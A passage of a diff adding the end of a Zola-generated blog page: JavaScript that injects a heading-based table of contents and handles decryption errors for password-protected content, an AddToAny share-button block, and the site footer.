+          scrollOffset: 40,
+          });
+
+          // ▼▼▼ Inject TOC based on headings ▼▼▼
+          const tocContainer = document.createElement('nav');
+          tocContainer.className = 'toc';
+          const headers = block.querySelectorAll('.post-content h1, .post-content h2, .post-content h3');
+          if (headers.length > 0) {
+            const tocList = document.createElement('ul');
+            headers.forEach(h => {
+              if (!h.id) {
+                h.id = h.textContent.trim().toLowerCase().replace(/\s+/g, '-');
+              }
+              const li = document.createElement('li');
+              li.style.marginLeft = h.tagName === 'H3' ? '1.2em' : h.tagName === 'H2' ? '0.6em' : '0';
+              const a = document.createElement('a');
+              a.href = '#' + h.id;
+              a.textContent = h.textContent;
+              li.appendChild(a);
+              tocList.appendChild(li);
+            });
+            tocContainer.innerHTML = `<strong style="display:block;margin-bottom:0.5em;">▼ Table of Contents</strong>`;
+            tocContainer.appendChild(tocList);
+            block.prepend(tocContainer);
+          }
+          // ▲▲▲ TOC Injection End ▲▲▲
+
+        } catch (e) {
+          let msg = e.message?.match(/utf-?8/i) ? 'Decryption failed' : '❌ ' + (e.message || 'Incorrect password or corrupt data');
+          error.textContent = msg;
+          error.style.display = 'block';
+        }
+      };
+    }
+
+    document.querySelectorAll('.encrypted-content').forEach(showDecryptionUI);
+  });
+</script>
+
+<!-- Share page -->
+<br>
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+
+
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time></a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
